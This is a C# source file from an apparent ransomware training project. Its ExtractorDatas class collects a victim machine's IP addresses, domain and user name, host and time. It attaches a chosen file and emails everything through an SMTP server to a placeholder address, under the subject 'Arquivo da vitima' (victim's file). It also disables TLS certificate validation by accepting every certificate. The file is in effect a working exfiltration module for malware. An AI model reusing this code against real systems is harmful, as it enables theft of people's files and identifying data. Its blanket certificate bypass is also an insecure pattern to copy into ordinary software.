using System.Net.Mail;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace Ransomware_Training;

public static class ExtractorDatas
{
    public static void Extract(string file)
    {
        DateTime now = DateTime.Now;
        string subject = "Arquivo da vitima";
        string emailBody = "";

        var host = Dns.GetHostEntry(Dns.GetHostName());

        foreach (var address in host.AddressList)
        {
            emailBody += "Address: " + address;
        }

        emailBody += "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\n";
        emailBody += "Host: " + host + "\n";
        emailBody += "Time: " + now.ToString() + "\n";

        string fromAddress = ("username@email.com");
        string toAddress = ("username@email.com");
        string password = "applicativoMailPassword";
        string smtpServer = "smtp.email.com";
        int smtpPort = 587;

        ServicePointManager.ServerCertificateValidationCallback = ValidateCertificate;

        using (SmtpClient client = new SmtpClient(smtpServer, smtpPort))
        {
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(fromAddress, password);

            using (MailMessage mailMessage = new MailMessage(fromAddress, toAddress))
            {
                mailMessage.Subject = subject;
                mailMessage.Body = emailBody;

                Attachment attachment = new Attachment(file);
                mailMessage.Attachments.Add(attachment);

                try
                {
                    client.Send(mailMessage);
                    Console.WriteLine("Email enviado com sucesso.");
                }
                catch (SmtpException ex)
                {
                    Console.WriteLine("Falha ao enviar e-mail. Mensagem de erro: " + ex.Message);
                }
            }
        }
    }

    static bool ValidateCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
    {
        return true;
    }
}
